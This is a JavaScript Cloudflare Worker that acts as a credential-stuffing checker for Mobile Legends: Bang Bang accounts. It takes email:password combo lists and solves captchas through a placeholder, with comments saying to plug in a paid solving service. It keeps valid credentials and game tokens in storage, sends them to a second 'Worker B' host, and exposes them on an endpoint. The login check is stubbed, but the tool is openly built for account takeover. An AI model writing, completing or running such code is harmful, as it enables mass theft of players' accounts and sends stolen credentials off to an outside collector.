export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (request.method === "POST" && url.pathname === "/check") {
      const { combos } = await request.json();
      if (!Array.isArray(combos)) {
        return new Response(JSON.stringify({ error: "Invalid combos" }), { status: 400 });
      }

      const results = await Promise.all(
        combos.map(async (combo) => {
          const [email, password] = combo.split(/[:|]/);
          const captchaToken = await solveNecaptcha(env.NECAPTCHA_KEY);
          const valid = await checkMLBBAccount(email, password, captchaToken);
          if (valid) {
            const cred = `${email}|${password}|${valid.game_token}`;
            await env.SESSION_KV.put(`session:${Date.now()}:${Math.random()}`, cred, { expirationTtl: 3600 });
            await sendToWorkerB(env, cred);
            return { combo, status: "valid" };
          }
          return { combo, status: "invalid" };
        })
      );

      return new Response(JSON.stringify(results), {
        headers: { "Content-Type": "application/json" },
      });
    }

    if (request.method === "GET" && url.pathname === "/session-valid") {
      const list = await env.SESSION_KV.list({ prefix: "session:" });
      const values = [];
      for (const item of list.keys) {
        const val = await env.SESSION_KV.get(item.name);
        if (val) values.push(val);
      }
      return new Response(values.join("\n"), {
        headers: { "Content-Type": "text/plain" },
      });
    }

    return new Response("Not Found", { status: 404 });
  },
};

async function solveNecaptcha(apiKey) {
  // Dummy Necaptcha solver – integrasikan API CapMonster/2captcha di sini
  return "dummy_captcha_token";
}

async function checkMLBBAccount(email, password, captchaToken) {
  // Dummy MLBB API request – ganti dengan HTTP request asli
  if (password === "passwordbenar") {
    return { game_token: "dummy_game_token" };
  }
  return null;
}

async function sendToWorkerB(env, cred) {
  await fetch(env.WORKER_B_URL + "/save", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Secret-Key": env.SECRET_KEY_B,
    },
    body: JSON.stringify({ cred }),
  });
}
